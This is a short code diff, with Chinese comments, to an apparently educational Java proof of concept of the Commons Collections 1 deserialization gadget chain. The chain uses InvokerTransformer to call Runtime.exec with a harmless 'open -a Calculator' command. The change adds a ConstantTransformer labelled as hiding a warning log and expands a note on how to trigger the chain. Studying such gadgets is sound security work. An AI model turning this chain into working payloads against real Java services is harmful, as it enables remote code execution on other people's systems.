@@ -47,7 +47,8 @@ public class CommonCollections1 {
                 // 执行Runtime类的exec方法, 传入的值的类型是String, 值如下"open -a Calculator"
                 new InvokerTransformer("exec",
                         new Class[]{String.class}, new Object[]{"open -a Calculator"}
-                )
+                ),
+                new ConstantTransformer(1) // 隐藏告警日志
         };
         ChainedTransformer transformerChain = new ChainedTransformer(transformers);
 
@@ -63,7 +64,7 @@ public class CommonCollections1 {
         // Map outerMap = TransformedMap.decorate(innerMap, transformerChain, null);
         // Map outerMap = TransformedMap.decorate(innerMap, transformerChain, transformerChain);
 
-        // put元素的时候实现transfer包装, 进而执行我们的恶意代码
+        // put元素的时候实现transfer包装, 进而执行我们的恶意代码, 但是序列化只存储数据不存储函数执行, 所以需要另找办法
         // 我们需要执行TransformedMap中的 transformKey() 或者 transformValue()
         // outerMap.put("test", "xxx");
 
